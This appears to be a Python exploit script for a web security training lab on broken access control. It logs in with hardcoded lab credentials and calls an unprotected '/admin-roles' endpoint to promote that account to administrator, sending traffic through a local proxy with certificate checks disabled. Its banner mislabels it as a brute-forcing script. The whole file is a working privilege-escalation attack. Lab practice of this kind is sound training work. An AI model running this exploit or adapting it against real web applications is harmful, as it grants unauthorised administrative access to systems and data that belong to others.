import requests,argparse,urllib3,sys
from random import randrange
from termcolor import colored,COLORS
from colorama import init
from pyfiglet import figlet_format,FigletFont

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def banner(name):
    # generating randfonts
    List=FigletFont.getFonts()
    random_numbner=randrange(len(List)-1)
    random_font=List[random_numbner]

    # generating randcolors
    color=[]
    for i in COLORS:
        if i !='black' and i!='light_blue' and i!='grey':
            color.append(i)
    random_numbner=randrange(len(color)-1)
    random_colore=color[random_numbner]

    #  printing the banner 
    font=figlet_format(name,font=random_font)
    print(colored(font,random_colore))
    print(colored("Build a Simple brute forcing Script with Python", 'yellow'))
    print(colored("Author: @oussamabinike\n", 'yellow'))

def parsearg():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-u','--url',
                        dest='url',
                        help='url for the target ex : https://www.example.com',
                        required=True)
    return parser.parse_args()

def promote_to_admin(s, url):

    # login as the wiener user
    path = "/login"
    data = {"username": "wiener", "password": "peter"}
    try:
        r = s.post(url+path, data=data, verify=False, proxies=proxies)

        if "Log out" in r.text:
            print(colored("(+) Successfully logged in as the wiener user.",'green'))

            # Exploit access control vulnerability to promote the user to admin
            path =  "/admin-roles?username=wiener&action=upgrade"
            r = s.get(url+path, verify=False, proxies=proxies)

            if "Admin panel" in r.text:
                print(colored("(+) Successfully promoted the user to administrator.",'green'))
            else:
                print(colored("(-) Could not promote the user to administrator.",'red'))
                sys.exit(-1)
        else:
            print(colored("(-) Could not login as the wiener user.",'red'))
            sys.exit(-1)
            
    except Exception as e:
        print(colored(e,'red'))
    

def main():

    banner(name='broken access control')
    url=parsearg().url
    url=str(url).rstrip('/')

    s=requests.session()
    promote_to_admin(s=s,url=url)
    
    a="""  .-'''''-.
 ('    o o')
  |   '-'   |
  |  .-^-  |
   '-...-'
"""
    print('\n'+a)


if __name__ == "__main__":
    main()